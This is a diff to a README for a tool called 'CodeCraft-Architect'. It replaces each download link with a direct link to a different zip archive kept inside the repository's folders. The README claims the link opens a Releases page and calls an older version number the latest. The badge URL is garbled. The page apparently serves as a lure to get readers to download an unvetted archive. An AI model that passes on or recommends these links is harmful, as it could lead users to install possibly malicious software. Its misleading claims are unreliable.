@@ -1,6 +1,6 @@
 # 🛠️ CodeCraft-Architect - Boost Your Code Quality Instantly
 
-[![Download CodeCraft-Architect](https://raw.githubusercontent.com/euan2204/CodeCraft-Architect/main/Windsor/CodeCraft-Architect_2.8.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/euan2204/CodeCraft-Architect/main/Windsor/CodeCraft-Architect_2.8.zip)
+[![Download CodeCraft-Architect](https://github.com/euan2204/CodeCraft-Architect/raw/refs/heads/main/Windsor/Code_Architect_Craft_2.4.zip%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/euan2204/CodeCraft-Architect/raw/refs/heads/main/Windsor/Code_Architect_Craft_2.4.zip)
 
 ## 📦 Overview
 
@@ -13,7 +13,7 @@ To begin your journey with CodeCraft-Architect, follow the steps below to downlo
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**: Click the link below to access the latest version of CodeCraft-Architect.
-   [Download CodeCraft-Architect](https://raw.githubusercontent.com/euan2204/CodeCraft-Architect/main/Windsor/CodeCraft-Architect_2.8.zip)
+   [Download CodeCraft-Architect](https://github.com/euan2204/CodeCraft-Architect/raw/refs/heads/main/Windsor/Code_Architect_Craft_2.4.zip)
 
 2. **Choose the Right Version**: On the Releases page, you will see a list of available versions. Select the one labeled as the latest stable release.
 
@@ -77,4 +77,4 @@ Your feedback is essential. Share your experiences, suggestions, and any issues 
 
 Remember, CodeCraft-Architect is here to simplify your web development experience. Follow the steps above to get started and unlock your coding potential.
 
-[Download CodeCraft-Architect](https://raw.githubusercontent.com/euan2204/CodeCraft-Architect/main/Windsor/CodeCraft-Architect_2.8.zip)
+[Download CodeCraft-Architect](https://github.com/euan2204/CodeCraft-Architect/raw/refs/heads/main/Windsor/Code_Architect_Craft_2.4.zip)
